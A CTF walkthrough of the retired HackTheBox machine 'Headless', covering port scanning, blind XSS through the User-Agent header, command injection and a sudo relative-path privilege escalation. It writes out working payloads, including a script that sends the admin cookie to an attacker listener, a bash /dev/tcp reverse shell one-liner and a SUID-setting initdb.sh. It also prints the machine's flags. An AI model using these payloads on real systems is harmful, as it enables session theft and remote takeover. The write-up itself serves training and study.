# Headless — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Headless |
| OS | Linux (Debian 12) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.78.186` |
| Tools Used | Nmap, Gobuster, curl, Python HTTP server, nc |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — Blind XSS via User-Agent → Admin Cookie → Command Injection](#foothold--blind-xss-via-user-agent--admin-cookie--command-injection)
- [Privilege Escalation — sudo syscheck Relative Path Hijack](#privilege-escalation--sudo-syscheck-relative-path-hijack)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap full TCP scan + targeted service scan | Ports 22 (SSH) and 5000 (Werkzeug/Python HTTP) open |
| 2 | Gobuster endpoint discovery | `/support` (200) and `/dashboard` (500) discovered |
| 3 | XSS payload in `message` field on `/support` | Triggers "Hacking Attempt Detected" security report — reveals admin review workflow |
| 4 | Unique value in `User-Agent` header | Reflected verbatim in the security report HTML — confirms header injection surface |
| 5 | Blind XSS payload in `User-Agent` | Admin’s browser executes attacker JavaScript — `is_admin` cookie exfiltrated |
| 6 | Admin cookie used to access `/dashboard` | Authenticated as administrator — report generation functionality exposed |
| 7 | OS command injection via `date` POST parameter | `;bash -c 'bash -i >& /dev/tcp/10.10.16.36/1234 0>&1'` — reverse shell as `dvir` |
| 8 | `sudo -l` → `(ALL) NOPASSWD: /usr/bin/syscheck` | syscheck script reads `./initdb.sh` using a relative path |
| 9 | Malicious `initdb.sh` planted in `/tmp` | `chmod u+s /bin/bash` written and made executable |
| 10 | `sudo /usr/bin/syscheck` executed from `/tmp` | syscheck runs as root, calls `./initdb.sh` → SUID set on `/bin/bash` |
| 11 | `/bin/bash -p` | `euid=0(root)` — root shell |

---

## Reconnaissance

### Nmap — Phase 1: Full TCP Port Sweep

The first scan sweeps all 65535 TCP ports at high speed with host discovery disabled (`-Pn`). The `--open` flag filters output to only show ports in the open state, keeping the output clean. This phase is purely about finding which ports are alive — no version detection or scripts yet.

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -p- --open -T4 10.129.78.186
```

```
Nmap scan report for 10.129.78.186
Host is up (0.19s latency).

Not shown: 65533 closed tcp ports (reset)

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Two ports open. The `upnp` label on port 5000 is just Nmap’s service-database guess based on the port number — it means nothing here. The follow-up scan will resolve the real service.

> **Note — always scan all ports on HTB machines.** The default `nmap <target>` without `-p-` only checks the top 1000 most common ports. Non-standard ports like 5000, 8080, 8443, 3000, and 9000 are missed entirely. On this machine port 5000 holds the entire web application — the default scan would have found nothing except SSH.

### Nmap — Phase 2: Targeted Service and Version Scan

With the open ports identified, a deep scan is run against only those two ports. `-sS` (SYN scan), `-sV` (version detection), `-sC` (default scripts) together produce full service fingerprinting:

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -sS -sV -sC -p 22,5000 -T4 10.129.78.186
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:b2:0f:2b:c6:17 (ED25519)

5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Service inventory:**

| Port | Service | Version | Significance |
|------|---------|---------|---------------|
| 22/tcp | OpenSSH | 9.2p1 Debian 12 | SSH — no credentials yet, noted for later |
| 5000/tcp | HTTP | Werkzeug 2.2.2 / Python 3.11.2 | Entire web application — primary attack surface |

**What Werkzeug tells us:** Werkzeug is a Python WSGI utility library — the most common web framework foundation for Flask applications. Seeing `Werkzeug/2.2.2 Python/3.11.2` tells us the backend is a Python web application, almost certainly Flask. This matters because Flask often uses signed session cookies, command-line `subprocess` or `os.system()` calls for functionality, and developer-built authentication rather than mature frameworks — all of which are fertile ground for vulnerabilities.

### Gobuster — Endpoint Discovery

With the web service fingerprinted, directory and endpoint brute-forcing is run against the application to map its attack surface:

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://10.129.78.186:5000/ \
  -w /home/kali/HackTheBox/HackTheBox_Room/headless/wordlist \
  -x .php,.txt,.html \
  -t 30
```

```
/support    (Status: 200) [Size: 2363]
/dashboard  (Status: 500) [Size: 265]
```

**Two endpoints found:**

| Endpoint | Status | Initial Read | What It Actually Is |
|----------|--------|-------------|---------------------|
| `/support` | 200 | Normal page | Support contact form — the XSS entry point |
| `/dashboard` | 500 | Server error | Admin panel — accessible only with the admin cookie |

> **Key insight — a 500 during content discovery is not a dead end.** A `500 Internal Server Error` from Gobuster means the route exists but something went wrong when hit without the right context — usually missing authentication, a missing parameter, or the application throwing an exception. `/dashboard` returned 500 because it expects an `is_admin` cookie with admin-level value. Without it, the application errors out. This is still a valuable discovery — it marks privileged functionality that should be investigated after credentials or a session token are obtained.

---

## Foothold — Blind XSS via User-Agent → Admin Cookie → Command Injection

### Step 1 — Analyse the /support Form

Browsing to `http://10.129.78.186:5000/support` presents a customer support contact form. The form accepts five fields:

```
fname, lname, email, phone, message
```

A baseline POST request looks like this:

```http
POST /support HTTP/1.1
Host: 10.129.78.186:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs

fname=test&lname=test&email=test%40test.com&phone=1234&message=test
```

Notice the `is_admin` cookie is already present — the application sets it when the page is visited. The value `InVzZXIi` is base64 for `"user"` — confirming the role encoding is simple and the admin version will be similarly structured but with a different role value.

### Step 2 — Discover the Security Report Workflow

Placing a basic XSS test payload in the `message` field produces an unexpected response:

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST http://10.129.78.186:5000/support \
  -d 'fname=test&lname=test&email=test@test.com&phone=1234&message=<script>alert(1)</script>'
```

Instead of a normal “thank you” response, the application returns:

```
Hacking Attempt Detected

Your IP address has been flagged. A report with your browser information
has been sent to the administrators for investigation.
```

And the report output includes the full request metadata:

```
Method, URL, Host, User-Agent, Referer, Origin, Cookie
```

This is the key architectural discovery. The application has a **security detector** that fires when XSS-like input is submitted — and when it fires, it generates a report that gets sent to an administrator. That report includes the **full HTTP request headers**. The immediate question is: if the administrator’s browser renders those headers as HTML, and we control the headers, can we inject JavaScript that runs in the admin’s browser?

```
message field        → triggers report generation
attacker headers     → embedded in the report HTML
admin browser        → renders the report
                     → executes our JavaScript
```

### Step 3 — Confirm Header Reflection in the Security Report

To verify that `User-Agent` is reflected into the report HTML, a unique test string is placed there and the XSS-triggering message is submitted:

```http
POST /support HTTP/1.1
Host: 10.129.78.186:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: TESTVALUE-12345

fname=test&lname=test&email=test@test.com&phone=1234&message=<script>alert(1)</script>
```

The security report response shows:

```html
<strong>User-Agent:</strong> TESTVALUE-12345
```

The `User-Agent` is rendered directly into the HTML of the security report without any encoding or sanitisation. Since this report is viewed by the administrator in their browser, any HTML or JavaScript placed in `User-Agent` will execute in the admin’s browsing context — including any JavaScript that reads and exfiltrates their cookies.

### Step 4 — Deliver the Blind XSS Payload via User-Agent

The attack now uses two separate inputs working together:

- **`message`** — contains a basic XSS pattern to trigger the “Hacking Attempt Detected” workflow
- **`User-Agent`** — contains the actual malicious JavaScript payload

The JavaScript payload fetches the admin’s cookies and sends them to a listener on the attack machine:

```javascript
<script>
  var i = new Image();
  i.src = "http://10.10.16.36:8000/?cookie=" + document.cookie;
</script>
```

First, start an HTTP listener to receive the exfiltrated cookie:

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

Then send the request with the XSS payload in `User-Agent`:

```http
POST /support HTTP/1.1
Host: 10.129.78.186:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <script>var i=new Image();i.src="http://10.10.16.36:8000/?cookie="+document.cookie;</script>

fname=test&lname=test&email=test@test.com&phone=1234&message=<script>alert(1)</script>
```

When the administrator opens the security report in their browser, the JavaScript in the `User-Agent` field executes and their `is_admin` cookie is sent to the listener:

```
10.129.78.186 - - [GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0]
```

**Admin cookie captured:** `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`

**Cookie comparison:**

| Role | Cookie Value | Decoded |
|------|-------------|----------|
| User (original) | `InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs` | `"user"` + signature |
| Admin (stolen) | `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0` | `"admin"` + signature |

> **Why this is called Blind XSS:** Regular (reflected) XSS is when you inject a payload and it immediately executes in your own browser response. Blind XSS is when the payload executes somewhere else — in a different user’s browser, in a different application, at a different time — and you never directly see the execution. You only know it worked when the callback (cookie exfiltration, DNS ping, screenshot) arrives. The attack here is blind because the administrator’s browser is the execution environment, not ours.

### Step 5 — Access /dashboard as Administrator

With the admin cookie, the previously 500-erroring `/dashboard` endpoint is now accessible. A quick `curl` confirms authenticated access:

```bash
Hackerpatel007_1@htb[/htb]$ curl -i \
  -b 'is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' \
  'http://10.129.78.186:5000/dashboard'
```

The dashboard loads and presents a report generation interface. It accepts a `date` parameter via POST — used to generate system reports for a specified date.

### Step 6 — Identify and Confirm OS Command Injection in the date Parameter

The dashboard’s report generation functionality takes a date value and passes it to a backend system command — almost certainly something like `python subprocess.run(["generate_report", date])` or a shell call like `os.system("report.sh " + date)`. Either way, if the date value is passed unsanitised into a shell context, a `;` separator lets us append arbitrary commands.

**Test with a baseline legitimate request first:**

```http
POST /dashboard HTTP/1.1
Host: 10.129.78.186:5000
Content-Type: application/x-www-form-urlencoded
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

date=2023-09-15
```

A normal report is returned. Now inject a command separator followed by a `sleep` to confirm blind command injection via timing:

```bash
Hackerpatel007_1@htb[/htb]$ time curl -s \
  -b 'is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' \
  -X POST http://10.129.78.186:5000/dashboard \
  -d 'date=2023-09-15;sleep 5'
```

If the response takes ~5 seconds longer than the baseline, command injection is confirmed. Once confirmed, a reverse shell is delivered.

### Step 7 — Deliver Reverse Shell via Command Injection

Start the Netcat listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 1234
```

Send the injection. The bash reverse shell is URL-encoded since it’s in a POST body — `+` replaces spaces and `%26` replaces `&`, `%3E` replaces `>`:

```http
POST /dashboard HTTP/1.1
Host: 10.129.78.186:5000
Content-Type: application/x-www-form-urlencoded
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

date=2023-09-15;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.36/1234+0>%261'
```

What the server actually executes after URL decoding:

```bash
date=2023-09-15; bash -c 'bash -i >& /dev/tcp/10.10.16.36/1234 0>&1'
```

The `;` terminates the legitimate date command and the second `bash -c` spawns an interactive reverse shell connecting back to port 1234.

The listener receives the connection:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.78.186] 49320
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$
```

Shell obtained as `dvir`. Upgrade it:

```bash
dvir@headless:~/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background with `Ctrl+Z`, then:

```bash
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
```

```bash
dvir@headless:~/app$ export TERM=xterm
dvir@headless:~/app$ stty rows 38 columns 116
```

### Step 8 — User Flag

```bash
dvir@headless:~$ cat user.txt
```

```
9555cfc3b64ffef053cfff5ba8cf801c
```

---

## Privilege Escalation — sudo syscheck Relative Path Hijack

### Step 1 — Check sudo Permissions

```bash
dvir@headless:~$ sudo -l
```

```
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

`dvir` can run `/usr/bin/syscheck` as root without a password. The critical next step is always to **read the script** — `sudo` permission on a script is only interesting if you understand what that script does internally.

### Step 2 — Read and Analyse /usr/bin/syscheck

```bash
dvir@headless:~$ cat /usr/bin/syscheck
```

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Reading through this script, notice two things immediately:

**All system commands use absolute paths** — `/usr/bin/find`, `/usr/bin/date`, `/usr/bin/echo`, `/usr/bin/df`, etc. The developer was careful about PATH-independent execution for most of the script.

**One command does not:** The very last meaningful line is:

```bash
./initdb.sh 2>/dev/null
```

This is a **relative path** — it resolves `initdb.sh` from whatever the **current working directory** is at the time `syscheck` runs. If `syscheck` is invoked while standing in a directory that contains an `initdb.sh` file, that file runs as root.

**The full vulnerability chain:**

```
sudo /usr/bin/syscheck
        ↓
runs as root (EUID check passes)
        ↓
initdb.sh not running → enters the if-branch
        ↓
./initdb.sh  ← resolved from current working directory
        ↓
/tmp/initdb.sh  ← if we’re standing in /tmp
        ↓
runs as root → executes our payload
```

### Step 3 — Plant the Malicious initdb.sh in /tmp

`/tmp` is world-writable. Navigate there and create the malicious `initdb.sh`:

```bash
dvir@headless:~$ cd /tmp
dvir@headless:/tmp$ echo 'chmod u+s /bin/bash' > initdb.sh
dvir@headless:/tmp$ chmod +x initdb.sh
```

```bash
dvir@headless:/tmp$ cat initdb.sh
```

```
chmod u+s /bin/bash
```

```bash
dvir@headless:/tmp$ ls -la initdb.sh
```

```
-rwxr-xr-x 1 dvir dvir 21 Oct 05 10:15 initdb.sh
```

### Step 4 — Execute syscheck from /tmp

This must be run **from inside `/tmp`** so that `./initdb.sh` resolves to `/tmp/initdb.sh`:

```bash
dvir@headless:/tmp$ sudo /usr/bin/syscheck
```

```
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.00, 0.03, 0.00
Database service is not running. Starting it...
```

`Database service is not running. Starting it...` confirms `./initdb.sh` executed. syscheck (running as root) called `./initdb.sh` from `/tmp`, which ran `chmod u+s /bin/bash` with root privileges.

### Step 5 — Verify SUID and Spawn Root Shell

```bash
dvir@headless:/tmp$ ls -la /bin/bash
```

```
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

The `s` in the owner execute position confirms SUID is set. Running `bash -p` launches bash while preserving the SUID effective root UID:

```bash
dvir@headless:/tmp$ /bin/bash -p
```

```
bash-5.2# id
uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
```

`euid=0(root)` — full root shell.

### Step 6 — Root Flag

```bash
bash-5.2# cat /root/root.txt
```

```
bdca4ea722b9346623a0f0c6aac936e6
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `9555cfc3b64ffef053cfff5ba8cf801c` |
| Root Flag | `bdca4ea722b9346623a0f0c6aac936e6` |

---

## Lessons Learned

1. **When an application says “a report has been sent to an administrator,” stop and think about what that report contains.** This machine’s “Hacking Attempt Detected” message was not a dead end — it was a signal that admin-reviewed content exists. Any time a web application generates an admin-facing report, audit, or notification from user input, that report is a potential blind XSS surface. The question to immediately ask is: what user-controlled data ends up in that report, and does the admin’s browser render it as HTML?

2. **HTTP request headers are attacker-controlled input — treat them like form fields.** `User-Agent`, `Referer`, `X-Forwarded-For`, `Origin`, `Accept-Language`, and custom headers are all values the client sets. Any application that logs or displays these values without output encoding is vulnerable to injection. Here, `User-Agent` was reflected raw into the security report HTML, turning a standard web header into a JavaScript execution vector in the admin’s browser.

3. **Blind XSS requires separating the trigger from the payload.** The `message` field triggered the security report workflow. The `User-Agent` field carried the malicious JavaScript. These are two different inputs doing two different jobs in the same attack.

4. **A `500` from content discovery is a lead, not a failure.** `/dashboard` returning 500 during the Gobuster scan told us the route exists but requires something we didn’t have yet. An unauthenticated 500 on an admin-named endpoint is almost always an authentication gate.

5. **The `date` parameter name is a strong signal for OS command injection.** Backend report generation, log queries, and scheduled tasks commonly pass user-supplied date strings into shell commands. Whenever a parameter is named `date`, `from`, `to`, `start`, `end`, or similar — especially in an admin panel — it’s a high-priority target for command injection.

6. **When reading a `sudo`-permitted script, don’t stop at the filename — read every single line.** The `syscheck` script looked like a read-only system information tool. Everything in it used absolute paths except one line: `./initdb.sh`. That single relative path turned a harmless monitoring script into instant root access.

7. **Relative paths in privileged scripts are exploitable if the caller controls the working directory.** `./initdb.sh` resolves from whatever directory `syscheck` is called from — and `sudo` inherits the caller’s working directory. Since `dvir` controls `/tmp` and can create files there, running `sudo syscheck` from `/tmp` means root executes `/tmp/initdb.sh`.

---

## Full Attack Chain Reference

```
Nmap -Pn -p- --open -T4 → ports 22, 5000
        ↓
Nmap -sS -sV -sC -p 22,5000
  → 22: OpenSSH 9.2p1 Debian 12
  → 5000: Werkzeug 2.2.2 / Python 3.11.2 (Flask app)
        ↓
Gobuster dir → /support (200), /dashboard (500)
  → /dashboard is admin-gated, noted for later
        ↓
/support form — 5 fields: fname, lname, email, phone, message
  → Existing cookie: is_admin=InVzZXIi... (base64 "user")
        ↓
message=<script>alert(1)</script>
  → "Hacking Attempt Detected"
  → Report generated for admin review
  → Report includes: Method, URL, Host, User-Agent, Referer, Cookie...
        ↓
User-Agent: TESTVALUE-12345
  → Reflected verbatim in report HTML → header injection confirmed
        ↓
python3 -m http.server 8000 (cookie listener)
        ↓
User-Agent: <script>var i=new Image();i.src="http://10.10.16.36:8000/?cookie="+document.cookie;</script>
message: <script>alert(1)</script> (triggers report)
        ↓
Admin browser renders report → JS executes → cookie exfiltrated
  → is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 (base64 "admin")
        ↓
curl -b 'is_admin=ImFkbWluIg...' /dashboard → 200 OK (admin panel)
  → Report generation form with date= POST parameter
        ↓
nc -lvnp 1234 (reverse shell listener)
        ↓
POST /dashboard
  date=2023-09-15;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.36/1234+0>%261'
        ↓
dvir@headless:~/app$ (reverse shell received)
  → TTY upgrade via python3 pty + stty
  → cat ~/user.txt: 9555cfc3b64ffef053cfff5ba8cf801c
        ↓
sudo -l → (ALL) NOPASSWD: /usr/bin/syscheck
cat /usr/bin/syscheck → critical line: ./initdb.sh 2>/dev/null
        ↓
cd /tmp
echo 'chmod u+s /bin/bash' > initdb.sh
chmod +x initdb.sh
        ↓
sudo /usr/bin/syscheck (from /tmp)
  → "Database service is not running. Starting it..."
  → syscheck (root) executes ./initdb.sh → /tmp/initdb.sh
  → chmod u+s /bin/bash runs as root
        ↓
ls -la /bin/bash → -rwsr-xr-x (SUID confirmed)
/bin/bash -p → euid=0(root)
        ↓
cat /root/root.txt: bdca4ea722b9346623a0f0c6aac936e6
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn -p- --open -T4 10.129.78.186` | Full TCP port sweep — finds non-standard ports like 5000 |
| `sudo nmap -Pn -sS -sV -sC -p 22,5000 -T4 10.129.78.186` | Deep version and script scan on discovered ports |
| `gobuster dir -u http://10.129.78.186:5000/ -w <wordlist> -x .php,.txt,.html` | Endpoint discovery — finds `/support` and `/dashboard` |
| `curl -i http://10.129.78.186:5000/dashboard` | Manual check of 500-returning endpoint |
| `python3 -m http.server 8000` | Cookie exfiltration listener for blind XSS callback |
| XSS trigger via message + User-Agent payload | Blind XSS — triggers admin report, JS in User-Agent exfiltrates `is_admin` cookie |
| `curl -i -b 'is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' http://10.129.78.186:5000/dashboard` | Access admin panel with stolen cookie |
| `nc -lvnp 1234` | Reverse shell listener |
| `POST /dashboard date=2023-09-15;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.36/1234+0>%261'` | OS command injection via date parameter — delivers reverse shell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade dumb shell to PTY |
| `stty raw -echo; fg` | Pass raw input to remote shell |
| `export TERM=xterm && stty rows 38 columns 116` | Configure remote terminal |
| `sudo -l` | Enumerate sudo rights — reveals `syscheck` NOPASSWD |
| `cat /usr/bin/syscheck` | Read the privileged script — reveals `./initdb.sh` relative path |
| `cd /tmp && echo 'chmod u+s /bin/bash' > initdb.sh && chmod +x initdb.sh` | Plant malicious initdb.sh in attacker-writable directory |
| `sudo /usr/bin/syscheck` | Trigger exploit from /tmp — syscheck executes /tmp/initdb.sh as root |
| `ls -la /bin/bash` | Verify SUID bit set on bash |
| `/bin/bash -p` | Spawn root shell preserving SUID effective UID |
| `cat /root/root.txt` | Collect root flag |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1595 — Active Scanning | T1595.001 — Scanning IP Blocks | Nmap full TCP sweep (`-p-`) + targeted service scan to identify ports 22 and 5000 |
| T1592 — Gather Victim Host Information | T1592.002 — Software | Werkzeug/Python version fingerprinting; Flask application identification |
| T1083 — File and Directory Discovery | — | Gobuster endpoint brute-force discovering `/support` (200) and `/dashboard` (500) |
| T1059 — Command and Scripting Interpreter | T1059.007 — JavaScript | Blind XSS via `User-Agent` header — JavaScript executes in administrator’s browser context during security report review |
| T1539 — Steal Web Session Cookie | — | `document.cookie` exfiltration via blind XSS Image beacon — `is_admin` admin cookie stolen |
| T1550 — Use Alternate Authentication Material | T1550.004 — Web Session Cookie | Stolen `is_admin=ImFkbWluIg...` cookie replayed to authenticate as administrator on `/dashboard` |
| T1190 — Exploit Public-Facing Application | — | OS command injection in `date` POST parameter on `/dashboard` — `;` separator appends bash reverse shell |
| T1059 — Command and Scripting Interpreter | T1059.004 — Unix Shell | Bash reverse shell via `/dev/tcp` delivered through command injection in authenticated admin panel |
| T1548 — Abuse Elevation Control Mechanism | T1548.003 — Sudo and Sudo Caching | `dvir` has `(ALL) NOPASSWD: /usr/bin/syscheck` — sudo used to run privileged script that executes relative path |
| T1574 — Hijack Execution Flow | T1574.005 — Executable Installer File Permissions Weakness | `./initdb.sh` relative path in syscheck resolved to attacker-controlled `/tmp/initdb.sh` — executed as root via sudo |
| T1548 — Abuse Elevation Control Mechanism | T1548.001 — Setuid and Setgid | `chmod u+s /bin/bash` executed as root via hijacked initdb.sh; `bash -p` used to access root effective UID |

---

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
